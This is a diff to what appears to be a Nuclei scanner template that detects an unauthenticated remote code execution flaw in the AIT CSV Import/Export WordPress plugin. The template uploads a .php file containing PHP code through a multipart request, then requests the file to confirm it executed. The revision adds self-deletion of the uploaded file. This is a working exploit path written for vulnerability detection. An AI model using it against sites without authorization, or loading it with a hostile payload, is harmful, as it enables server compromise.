@@ -13,7 +13,12 @@ info:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
     cvss-score: 9.8
     cwe-id: CWE-434
-  tags: wp-plugin,rce,fileupload,unauth,wpscan,msf,wordpress,ait-csv,wp,intrusive
+  metadata:
+    max-request: 2
+  tags: wp-plugin,rce,fileupload,unauth,wpscan,msf,wordpress,ait-csv,wp,intrusive,vuln
+
+variables:
+  string: "ait-csv-import-export-rce"
 
 http:
   - raw:
@@ -27,10 +32,9 @@ http:
         Content-Disposition: form-data; name="file"; filename="{{randstr}}.php"
         Content-Type: application/octet-stream
 
-        sep=;<?php echo md5('ait-csv-import-export-rce');?>
+        sep=;<?php echo md5("{{string}}");unlink(__FILE__);?>
 
         --------------------------ab360007dbae2de8--
-
       - |
         GET /wp-content/uploads/{{randstr}}.php HTTP/1.1
         Host: {{Hostname}}
@@ -38,12 +42,7 @@ http:
     matchers-condition: and
     matchers:
       - type: word
-        part: body
+        part: body_2
         words:
-          - "fe394b60dc324c3bac3060d600ad4349"
-
-      - type: status
-        status:
-          - 200
-
-# Enhanced by mp on 2022/05/22
+          - '{{md5(string)}}'
+# digest: 4b0a004830460221009d491c6a5aee6cdc14c3068713d7d238c0ec1df4a7cc5e691a7624a1e09d65eb022100af80f6b46bd9fb9630b9af9de1399a3ca5dc7d666c55b859b422c77ff1018230:922c64590222798bb761d5b6d8e72950
